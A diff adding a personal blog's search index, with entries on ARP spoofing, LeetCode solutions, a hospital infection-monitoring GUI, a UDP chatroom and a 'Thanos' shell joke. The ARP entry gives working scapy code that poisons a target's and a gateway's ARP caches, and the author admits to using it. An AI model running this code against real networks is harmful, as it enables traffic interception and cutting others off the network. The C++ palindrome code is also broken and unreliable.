@@ -1,0 +1,117 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title><![CDATA[ArpAttack]]></title>
+    <url>%2F2018%2F09%2F02%2FArpAttack%2F</url>
+    <content type="text"><![CDATA[Arp断网攻击ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。 理论基础ARP地址转换表（ARP缓存）是依赖于计算机中高速缓冲存储器动态更新的，而高速缓冲存储器的更新是受到更新周期的限制的，只保存最近使用的地址的映射关系表项，这使得攻击者有了可乘之机，可以在高速缓冲存储器更新表项之前修改地址转换表，实现攻击。ARP请求为广播形式发送的，网络上的主机可以自主发送ARP应答消息，并且当其他主机收到应答报文时不会检测该报文的真实性就将其记录在本地的MAC地址转换表，这样攻击者就可以向目标主机发送伪ARP应答报文，从而篡改本地的MAC地址表。这就是所谓的APR欺骗攻击。 第一步：假设主机A访问某网站，那么要告知某网站我的IP和MAC地址，但这是以广播的方式告知的。 第二步，由于是广播方式告知，猥琐的B主机也知道了A的IP和Mac地址，于是B主机把自己伪装成某网站，给A发送回复，A误以为B就是某网站，因此更新了自己本机的ARP缓存。 第三步，两者建立连接，A不断将自己的请求发给B。如果B转发A的请求给某网站，再转发给A，那相当于A的流量都从B经过，这就是步骤4，因此可以会话劫持；如果B给A的是一个假地址，那么A永远上不了网了。 Python实现使用非常简单的scapy包123456789101112131415161718# -*- coding: utf-8 -*-from scapy.all import( Ether, ARP, sendp )eth=Ether()arp=ARP( op="is-at", hwsrc="本机mac", psrc="本机ip", hwdst="目标mac", pdst="目标ip" )print((eth/arp).show())sendp(eth/arp,inter=2,loop=1) 非常不稳定 升级版关键函数获取mac地址12345678def get_mac(tgt_ip): ''' 调用scapy的getmacbyip函数，获取攻击目标IP的MAC地址。 ''' tgt_mac = getmacbyip(tgt_ip) if tgt_mac is not None: return tgt_mac else: print("无法获取IP为：%s 主机的MAC地址，请检查目标IP是否存活"%tgt_ip) 伪造网关12345678910111213def create_arp_station(src_mac, tgt_mac, gateway_ip, tgt_ip): ''' 生成ARP数据包，伪造网关欺骗目标计算机 src_mac:本机的MAC地址，充当中间人 tgt_mac:目标计算机的MAC gateway_ip:网关的IP，将发往网关的数据指向本机（中间人），形成ARP攻击 tgt_ip:目标计算机的IP op=is-at,表示ARP响应 ''' eth = Ether(src=src_mac, dst=tgt_mac) arp = ARP(hwsrc=src_mac, psrc=gateway_ip, hwdst=tgt_mac, pdst=tgt_ip, op="is-at") pkt = eth / arp return pkt 伪造目标计算机12345678910111213def create_arp_gateway(src_mac, gateway_mac, tgt_ip, gateway_ip): ''' 生成ARP数据包，伪造目标计算机欺骗网关 src_mac:本机的MAC地址，充当中间人 gateway_mac:网关的MAC tgt_ip:目标计算机的IP，将网关发往目标计算机的数据指向本机（中间人），形成ARP攻击 gateway_ip:网关的IP op=is-at,表示ARP响应 ''' eth = Ether(src=src_mac, dst=gateway_mac) arp = ARP(hwsrc=src_mac, psrc=tgt_ip, hwdst=gateway_mac, pdst=gateway_ip, op="is-at") pkt = eth / arp return pkt 完整代码GitHub 参考资料Black Hat Python: Python Programming for Hackers and Pentesters计算机网络 最后再说一句Arp断网攻击时不好的行为，会对他人造成损失，以及被发现之后对自己也会造成创伤。 BTW，鱼酱明知道这是不好的行为但是死不悔改。]]></content>
+      <categories>
+        <category>CS</category>
+      </categories>
+      <tags>
+        <tag>Bad Codes</tag>
+        <tag>Arp</tag>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Longest Common Prefix]]></title>
+    <url>%2F2018%2F09%2F02%2FLongest-Common-Prefix%2F</url>
+    <content type="text"><![CDATA[QuestionWrite a function to find the longest common prefix string amongst an array of strings. If there is no common prefix, return an empty string “”. Example 1Input: [“flower”,”flow”,”flight”]Output: “fl” Example 2Input: [“dog”,”racecar”,”car”]Output: “”Explanation: There is no common prefix among the input strings. SolutionIntuitionFor a start we will describe a simple way of finding the longest prefix shared by a set of strings LCP(S_1 \ldots S_n)LCP(S​1…S​n​​). We will use the observation that : LCP(S_1 \ldots S_n) = LCP(LCP(LCP(S_1, S_2),S_3),\ldots S_n)LCP(S​1​​ …S​n​​ )=LC(LCP(LCP(S​1​​ ,S​2​​ ),S​3​​ ),…S​n ) AlgorithmTo employ this idea, the algorithm iterates through the strings [S_1\ldots S_n],[S​1​​ …S​n ], finding at each iteration ii the longest common prefix of strings LCP(S_1 \ldots S_i)LCP(S​1​​ …S​i​​ ) When LCP(S_1 \ldots S_i)LCP(S​1​​ …S​i​​ ) is an empty string, the algorithm ends. Otherwise after nn iterations, the algorithm returns LCP(S_1 \ldots S_n)LCP(S​1​​ …S​n​​ ). Part of Codes12345678910public String longestCommonPrefix(String[] strs) &#123; if (strs.length == 0) return ""; String prefix = strs[0]; for (int i = 1; i &lt; strs.length; i++) while (strs[i].indexOf(prefix) != 0) &#123; prefix = prefix.substring(0, prefix.length() - 1); if (prefix.isEmpty()) return ""; &#125; return prefix;&#125; Full Codes Can Get in GitHub]]></content>
+      <categories>
+        <category>CS</category>
+      </categories>
+      <tags>
+        <tag>LeetCode</tag>
+        <tag>Algorithms</tag>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Roman to Integer]]></title>
+    <url>%2F2018%2F09%2F01%2FRoman-to-Integer%2F</url>
+    <content type="text"><![CDATA[QuestionRoman numerals are represented by seven different symbols: I, V, X, L, C, D and M. Symbol Value I 1 V 5 X 10 L 50 C 100 D 500 M 1000 For example, two is written as II in Roman numeral, just two one’s added together. Twelve is written as, XII, which is simply X + II. The number twenty seven is written as XXVII, which is XX + V + II. Roman numerals are usually written largest to smallest from left to right. However,the numeral for four is not IIII. Instead, the number four is written as IV. Because the one is before the five we subtract it making four. The same principle applies to the number nine, which is written as IX. There are six instances where subtraction is used: I can be placed before V (5) and X (10) to make 4 and 9.X can be placed before L (50) and C (100) to make 40 and 90.C can be placed before D (500) and M (1000) to make 400 and 900.Given a roman numeral, convert it to an integer. Input is guaranteed to be within the range from 1 to 3999. Example 1Input: “III”Output: 3 Example 2Input: “IV”Output: 4 Example 3Input: “IX”Output: 9 Example 4Input: “LVIII”Output: 58Explanation: C = 100, L = 50, XXX = 30 and III = 3. Example 5Input: “MCMXCIV”Output: 1994Explanation: M = 1000, CM = 900, XC = 90 and IV = 4. Solution12345678910111213141516171819202122class Solution&#123; public static int romanToInt(String s) &#123; if (s == null || s.length() == 0) return -1; HashMap&lt;Character, Integer&gt; map = new HashMap&lt;Character, Integer&gt;(); map.put('I', 1); map.put('V', 5); map.put('X', 10); map.put('L', 50); map.put('C', 100); map.put('D', 500); map.put('M', 1000); int len = s.length(), result = map.get(s.charAt(len - 1)); for (int i = len - 2; i &gt;= 0; i--) &#123; if (map.get(s.charAt(i)) &gt;= map.get(s.charAt(i + 1))) result += map.get(s.charAt(i)); else result -= map.get(s.charAt(i)); &#125; return result; &#125;&#125; Full Codes Can Get in GitHub BTW校园网真的慢]]></content>
+      <categories>
+        <category>CS</category>
+      </categories>
+      <tags>
+        <tag>LeetCode</tag>
+        <tag>Algorithms</tag>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Palindrome Number]]></title>
+    <url>%2F2018%2F09%2F01%2FPalindrome-Number%2F</url>
+    <content type="text"><![CDATA[QuestionDetermine whether an integer is a palindrome. An integer is a palindrome when it reads the same backward as forward. Example 1Input: 121Output: true Example 2Input: -121Output: false ExplanationFrom left to right, it reads -121. From right to left, it becomes 121-. Therefore it is not a palindrome. Example 3Input: 10Output: false ExplanationReads 01 from right to left. Therefore it is not a palindrome. Follow upCoud you solve it without converting the integer to a string? SolutionIntuitionThe first idea that comes to mind is to convert the number into string, and check if the string is a palindrome, but this would require extra non-constant space for creating the string which is not allowed by the problem description. Second idea would be reverting the number itself, and then compare the number with original number, if they are the same, then the number is a palindrome. However, if the reversed number is larger than \text{int.MAX}int.MAX, we will hit integer overflow problem. Following the thoughts based on the second idea, to avoid the overflow issue of the reverted number, what if we only revert half of the \text{int}int number? After all, the reverse of the last half of the palindrome should be the same as the first half of the number, if the number is a palindrome. For example, if the input is 1221, if we can revert the last part of the number “1221” from “21” to “12”, and compare it with the first half of the number “12”, since 12 is the same as 12, we know that the number is a palindrome. Let’s see how we could translate this idea into an algorithm. AlgorithmFirst of all we should take care of some edge cases. All negative numbers are not palindrome, for example: -123 is not a palindrome since the ‘-‘ does not equal to ‘3’. So we can return false for all negative numbers. Now let’s think about how to revert the last half of the number. For number 1221, if we do 1221 % 10, we get the last digit 1, to get the second to the last digit, we need to remove the last digit from 1221, we could do so by dividing it by 10, 1221 / 10 = 122. Then we can get the last digit again by doing a modulus by 10, 122 % 10 = 2, and if we multiply the last digit by 10 and add the second last digit, 1 * 10 + 2 = 12, it gives us the reverted number we want. Continuing this process would give us the reverted number with more digits. Now the question is, how do we know that we’ve reached the half of the number? Since we divided the number by 10, and multiplied the reversed number by 10, when the original number is less than the reversed number, it means we’ve processed half of the number digits. Part of My Code(C++)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748class Solution &#123;public: int sum1,sum2; int front(int x,int y)&#123; int z=y/2; cout&lt;&lt;x/(10^(y-z))&lt;&lt;endl; return x/(10^(y-z)); &#125; int back(int x,int m)&#123; int y=x%10; for (; x/=10; )&#123; y = y*10 + x%10; &#125; cout&lt;&lt;y/(10^(m-m/2))&lt;&lt;endl; return y/(10^(m-m/2)); &#125; bool isPalindrome(int x) &#123; if(x&lt;0||(x%10==0&amp;&amp;x!=0))&#123; return false; &#125;else if(x&lt;10&amp;&amp;x&gt;=0)&#123; return true; &#125;else&#123; int i=0; int xbackup=x; static int a=0; do&#123; x=x/10; i++; a=i+1; &#125;while(x&gt;10); cout&lt;&lt;xbackup&lt;&lt;endl; int b=a; sum1=front(xbackup,a); cout&lt;&lt;sum1&lt;&lt;endl; sum2=back(xbackup,b); cout&lt;&lt;sum2&lt;&lt;endl; if(sum1==sum2)&#123; return true; &#125;else&#123; return false; &#125; &#125; &#125;&#125;; Full CodesGITHUB]]></content>
+      <categories>
+        <category>CS</category>
+      </categories>
+      <tags>
+        <tag>LeetCode</tag>
+        <tag>Algorithms</tag>
+        <tag>C++</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Reverse Integer]]></title>
+    <url>%2F2018%2F08%2F31%2FReverse-Integer%2F</url>
+    <content type="text"><![CDATA[QuestionGiven a 32-bit signed integer, reverse digits of an integer Example 1Input: 123Output: 321 Example 2Input: -123Output: -321 Example 3Input: 120Output: 21 NoteAssume we are dealing with an environment which could only store integers within the 32-bit signed integer range: [âˆ’231, 231 âˆ’ 1]. For the purpose of this problem, assume that your function returns 0 when the reversed integer overflows. SolutionPart of the code:(C++)1234567891011121314class Solution &#123; public: int reverse(int x) &#123; int rev = 0; while (x != 0) &#123; int pop = x % 10; x /= 10; if (rev &gt; INT_MAX/10 || (rev == INT_MAX / 10 &amp;&amp; pop &gt; 7)) return 0; if (rev &lt; INT_MIN/10 || (rev == INT_MIN / 10 &amp;&amp; pop &lt; -8)) return 0; rev = rev * 10 + pop; &#125; return rev; &#125;&#125;; Link to GitHubGITHUB]]></content>
+      <categories>
+        <category>CS</category>
+      </categories>
+      <tags>
+        <tag>LeetCode</tag>
+        <tag>Algorithms</tag>
+        <tag>C++</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Infection Monitoring System]]></title>
+    <url>%2F2018%2F08%2F30%2FInfection-Monitoring-System%2F</url>
+    <content type="text"><![CDATA[Abstract An infection monitoring system based on HIS. Main() 主函数 启动人机界面 1234567891011121314from gui_root import *from tkinter import *def gui_start(): #实例化一个窗口 ims_window = Tk() ims = gui_root(ims_window) #设置根窗口默认属性 ims.set_ims_window() #父窗口进入事件循环 ims_window.mainloop()gui_start() gui_root() 第一次界面函数 根界面函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980class gui_root():#初始化def __init__(self, ims_window): self.window = ims_window#设置窗口属性def set_ims_window(self): #设置窗口名 self.window.title("Infection Monitoring System") self.menubar = Menu(self.window) #创建下拉菜单Patients,然后将其加入到顶级的菜单栏中 self.patientmenu = Menu(self.menubar, tearoff=0) #创建新的病人信息窗口 self.patientmenu.add_command(label="New", command=self.new_window) self.patientmenu.add_command(label="Print", command=self.print_window) self.patientmenu.add_command(label="Exit", command=self.window.quit) self.menubar.add_cascade(label="Patients", menu=self.patientmenu) #创建下拉菜单Diseases,然后将其加入到顶级的菜单栏中 self.diseasemenu = Menu(self.menubar, tearoff=0) self.diseasemenu.add_command(label="New", command=self.new_disease) self.diseasemenu.add_command( label="Search", command=self.search_window) self.menubar.add_cascade(label="Disease", menu=self.diseasemenu) #创建下拉菜单Help,然后将其加入到顶级的菜单栏中 self.helpmenu = Menu(self.menubar, tearoff=0) self.helpmenu.add_command(label="About", command=self.about) self.menubar.add_cascade(label="Help", menu=self.helpmenu) #显示菜单 self.window.config(menu=self.menubar)##所需函数#测试函数def hello(self): print('hello')#版权说明函数def about_test(self): print("Developer: Chen Ziyu") print("MIT Lisence")#创建新病人窗口def new_window(self): self.new_window = Tk() self.new_patient_window = gui_new_patient(self.new_window) self.new_patient_window.set_new_patient_window() self.new_window.mainloop()#创建新疾病窗口def new_disease(self): self.new_disease = Tk() self.new_disease_window = gui_new_disease(self.new_disease) self.new_disease_window.set_new_disease_window() self.new_disease.mainloop()#创建打印窗口def print_window(self): self.print_window = Tk() self.new_print_window = gui_print_window(self.print_window) self.new_print_window.set_new_print_window() self.print_window.mainloop()#创建疾病查找窗口def search_window(self): self.search_window = Tk() self.new_search_window = gui_print_disease(self.search_window) self.new_search_window.set_new_print_disease() self.search_window.mainloop()#创建About窗口def about(self): self.about_window = Tk() self.new_about_window = gui_about(self.about_window) self.new_about_window.set_about_window() self.about_window.mainloop() 病人类1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253class patient():def __init__(self): print("创建病人类")def showinfo(self): print("病人信息如下 \n ID：%s \n 姓名：%s ，性别：%s ； \n 电话：%s ， 地址：%s \n 疾病： %s ，疾病ID：%s" % ( self.id, self.name, self.gender, self.tel, self.address, self.disease_name, self.disease_id))def saveinfo(self): global global_col workbook = xlrd.open_workbook('patients.xls') workbooknew = copy(workbook) ws = workbooknew.get_sheet(0) ws.write(global_col, 0, self.id) ws.write(global_col, 1, self.name) ws.write(global_col, 2, self.gender) ws.write(global_col, 3, self.tel) ws.write(global_col, 4, self.address) ws.write(global_col, 5, self.disease_name) ws.write(global_col, 6, self.disease_id) global_col = global_col+1 workbooknew.save('patients.xls')def sava_a_info(self, r): raw = r workbook = xlrd.open_workbook('patients.xls') workbooknew = copy(workbook) table = workbook.sheet_by_index(0) ws = workbooknew.get_sheet(1) ws.write(r, 0, table.cell(r, 0).value) ws.write(r, 1, table.cell(r, 1).value) ws.write(r, 2, table.cell(r, 2).value) ws.write(r, 3, table.cell(r, 3).value) ws.write(r, 4, table.cell(r, 4).value) ws.write(r, 5, table.cell(r, 5).value) ws.write(r, 6, table.cell(r, 6).value) if int(table.cell(r, 6).value) == 0: ws.write(r, 7, '无传染性疾病') elif int(table.cell(r, 6).value) == 1: ws.write(r, 7, '甲型传染病') elif int(table.cell(r, 6).value) == 2: ws.write(r, 7, '乙型传染病') elif int(table.cell(r, 6).value) == 3: ws.write(r, 7, '丙型传染病') workbooknew.save('patients.xls') 疾病类1234567891011121314151617class disease():def __init__(self): print("创建疾病类")def saveinfo(self): global global_coll workbook = xlrd.open_workbook('diseases.xls') workbooknew = copy(workbook) ws = workbooknew.get_sheet(0) ws.write(global_coll, 0, self.id) ws.write(global_coll, 1, self.name) workbooknew.save('diseases.xls') global_coll = global_coll+1 总结 该系统以python tkinter函数为基础构造人机交互界面，设计出传染病检测系统，可通过不同的接口嵌入到市面上主流的HIS系统中，方便快捷；因为navicat for mysql需要版权，所以构建系统时采用最原始的excel表存储数据，这是非常不明智的，以下为sql数据表构建代码： 123456789101112131415161718192021222324252627282930 CREATE TABLE Patient( Pid INT NOT NULL , Pname VARCHAR COLLATE utf8_bin NOT NULL, Pgender VARCHAR COLLATE utf8_bin NOT NULL, Ptel INT NOT NULL, Paddress VARCHAR COLLATE utf8_bin NOT NULL, Did INT NOT NULL, Dname VARCHAR COLLATE utf8_bin NOT NULL, PRIMARY KEY (Pid), FOREIGN KEY (Did) REFERENCES Disease(Did),)CREATE TABLE Disease( Did INT NOT NULL , Dname VARCHAR COLLATE utf8_bin NOT NULL, Dinfect BOOLEAN NOT NULL, PRIMARY KEY (Did),)CREATE TABLE Doctor( DOid INT NOT NULL , DOname VARCHAR COLLATE utf8_bin NOT NULL, DOgender VARCHAR COLLATE utf8_bin NOT NULL, DOtel INT NOT NULL, DOposition VARCHAR COLLATE utf8_bin NOT NULL, PRIMARY KEY (DOid),) 最后再加一句 完整代码见GitHub个人仓库中HIS专栏,个人联系方式见About]]></content>
+      <categories>
+        <category>BME</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+        <tag>Hospital Information System</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Let's Talk About Delete]]></title>
+    <url>%2F2018%2F08%2F29%2FLet-s-Talk-About-Delete%2F</url>
+    <content type="text"><![CDATA[AnnouncementI Solemnly Swear That I Am Up To No Good What’s is Shell Shell is a computer program designed to be run by the command-line interpreter,as far as Wikipedia‘s concerned,typical operations performed by shell scripts include file manipulation, program execution, and printing text, while , a script which sets up the environment, runs the program, and does any necessary cleanup, logging, etc. is called a wrapper. The Environment Shell is a script language, just like java, php, python, javascript, etc., which can run in a script interpreter for interpretation execution and can be edited in the text editor. There are many kinds of shell languages, for instance, C Shell(/usr/bin/csh), K Shell(/usr/bin/ksh),Bourne Again Shell(/bin/bash) and so on. Ur First Shell Script Just open a text editor(vim,sublime,or even just the notepad !) and save as “helloworld.sh”.Write the following code in it. 12#!/bin/bashecho "Hello World !" In the file, “#!” is an an agreed mark that tells the system what interpreter is needed to execute the script. The “echo” command is used to output text to system command windows. Run Ur First Shell Script Press both keys “win” and “R” and type “cmd” in the window and then tap “Enter”.You will call up the script interpreter. Then, just drag the file “helloword.sh” into the new window and tap “Enter”, the Shell Command is running. Ur Second Shell Script Like ur first shell script, write the following code in a new .sh file and save as “test.sh”. 12#!/bin/bashlet i=`find . -type f | wc -l`/2 ; find . -type f -print0 | shuf -z -n $i | xargs -0 -- cat The more information about this code u can look up in my GitHub Respositories Run Ur Second Shell Script WARNING WARNING WARNING If u don’t want to get in trouble, DON’T RUN THAT CODE! JUST THINK ABOUT THANOS]]></content>
+      <categories>
+        <category>CS</category>
+      </categories>
+      <tags>
+        <tag>Bad Codes</tag>
+        <tag>Database</tag>
+        <tag>Shell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Chatroom]]></title>
+    <url>%2F2018%2F08%2F28%2FChatroom%2F</url>
+    <content type="text"><![CDATA[AbstractA small chatroom based on User Datagram Protocol 软件目的 实现简单的 UDP 实时聊天程序 运行设备与环境 Windows 或 Linux 或 Mac OS NodeJS 语言环境//Python 语言环境 创新点 采用脚本语言编写，适用于任何环境； 分为 NodeJS 版本和 Python 版本，适用不同的机器； 采用多线程方式，实现了聊天室基本的实时通信功能； Python 版本为第一版本，仅通过线程池实现多线程解决了实时通信问题；NodeJS版本为最终版,实现基本的大型聊天室功能（上线提醒，多对多群聊，一对一实时通信，离线消息等）； 关键代码Python 基本版服务器端接受线程实现 def receive_message(server)12345678910111213print('服务器接收数据函数执行，线程名字 %s' % threading.current_thread().name)data,addc=server.recvfrom(2048)print('client：', data.decode('utf-8'))time.sleep(5)t = threading.Thread(target=receive_message, args=(server,))t.start()t.join() 客户端发送线程实现 def send_message(client)12345678910111213print('客户端发送数据函数执行，线程名字 %s' % threading.current_thread().name)msg = input('client: ')client.sendto(msg.encode('utf-8'), address)time.sleep(10)t1 = threading.Thread(target=send_message, args=(client,))t1.start()t1.join() NodeJS 最终版用户上线提醒123456//默认连接后上线操作msg.udpSendMsg(client,function (err, bytes) &#123; if(err == 0) &#123; console.log("User1 上线!"); &#125;&#125;); 单对单私聊函数1234567891011//设置只能发送给 User2msg.setTo(&#123; name: 'User2' &#125;); msg.udpSendMsg(client, function (err, bytes) &#123; if (err) &#123; //发送失败 &#125; &#125;); 在线状态12345678910111213141516171819202122232425/*** 加入某个用户的在线状态* @param name* @param rinfo */var pushIntoPool = function (name, rinfo)&#123; var index = userPool.online.indexOf(name); if (index &gt;= 0) &#123; userPool.online.splice(index, 1); userPool.pool.splice(index, 1); &#125;userPool.online.push(name);userPool.pool.push(&#123; name: name, ip: rinfo.address, port: rinfo.port &#125;);&#125;; 离线消息1234567891011/*** 加入离线消息任务* @param msg*/var addInTask = function (msg)&#123; msgTask.tasks.push(&#123; msg: msg, expireTime: 7 *24 *600 + new Date().getTime() &#125;);&#125;; 后台轮询12345678910111213/*** 后台轮询任务*/var backgroundTask = function()&#123; for (var i = 0; i &lt; msgTask.tasks.length; i++) &#123; var m = msgTask.tasks.splice(i,1)[0]; sendMsg(m.msg);&#125;beginTask(); &#125;; 运行结果 总结一个成功软件的编写在于不断改进和完善，nodeJS 不同于适用于前端开发的 JavaScript，NodeJs更适合服务器的后端开发，其回调函数的异步特性大大改善了计算机性能，虽然不能完全替代协程与线程，但却能替代其一部分功 能，确实是非常方便的 源代码该软件源代码已上传至GitHub的个人仓库]]></content>
+      <categories>
+        <category>CS</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+        <tag>UDP</tag>
+        <tag>NodeJS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Hello World]]></title>
+    <url>%2F2018%2F08%2F26%2Fhello-world%2F</url>
+    <content type="text"><![CDATA[Welcome to Zoe C.‘s Mistletoe Check About for more info. If you get any technical problems about computer science, clinical medicine or biomedical engineering, you can contact me via email(yakumorainy@outlook.com) or you can ask me on GitHub.]]></content>
+      <categories>
+        <category>test</category>
+      </categories>
+      <tags>
+        <tag>test</tag>
+      </tags>
+  </entry>
+</search>
